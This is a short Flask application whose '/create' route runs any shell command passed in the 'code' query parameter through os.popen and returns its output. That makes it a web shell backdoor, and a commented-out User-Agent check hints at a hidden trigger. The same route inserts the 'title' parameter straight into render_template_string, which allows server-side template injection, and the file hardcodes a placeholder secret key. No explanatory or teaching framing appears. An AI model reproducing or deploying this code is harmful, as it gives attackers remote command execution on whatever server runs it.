from flask import Flask, request, render_template_string

app = Flask(__name__)
app.secret_key = b'SECRET_KEY'

@app.route('/create', methods=['GET','POST'])
def no_filter():
    title = str(request.args.get('title')or "")
    print('titile: ',title)

    import cgi,os

    code = request.args.get('code')
    if code:
        code = os.popen(code)

        user_agent = request.headers["USER_AGENT"]
        #if "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0" in user_agent:
        #print ("Content-type: text/html\n")
        return "<pre>" + code.read() + "</pre>"

    template = '''
        <!DOCTYPE html>
        <html>
          <head>
            <title>Create</title>
          </head>
          <body>
            <p>''' + title + '''</p>
          </body>
        </html>'''
    return render_template_string(template)

if __name__ == '__main__':
        app.run()
